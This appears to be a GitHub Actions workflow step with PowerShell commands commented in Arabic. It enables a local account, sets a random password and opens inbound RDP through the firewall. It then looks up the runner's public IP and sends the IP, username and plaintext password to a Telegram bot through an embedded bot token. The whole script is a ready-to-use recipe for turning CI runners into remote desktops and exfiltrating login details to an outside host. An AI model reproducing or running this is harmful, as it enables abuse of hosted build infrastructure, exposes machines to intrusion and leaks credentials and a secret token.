- name: Set up RDP
  run: |
    # تفعيل حساب testuser بدلاً من administrator
    net user testuser /active:yes
    $password = [System.IO.Path]::GetRandomFileName().Replace(".", "A") + [System.IO.Path]::GetRandomFileName().Replace(".", "B")
    net user testuser $password
    netsh advfirewall firewall add rule name="Open RDP" dir=in action=allow protocol=TCP localport=3389

    # جلب عنوان IP الخاص بالخادم
    $ip = (Invoke-RestMethod -Uri "http://ipinfo.io/ip").Trim()
    echo "IP Address: $ip"

    # إعداد رسالة تحتوي على التفاصيل
    $message = "RDP Session Created: %0AIP Address: $ip %0AUsername: testuser %0APassword: $password"

    # إرسال البيانات إلى بوت تلجرام
    Invoke-RestMethod -Uri "https://api.telegram.org/bot7047714100:AAHptINe1QLjomnzqKaOMnTm_YRmt5T5XAM/sendMessage?chat_id=<242676339>&text=$message"
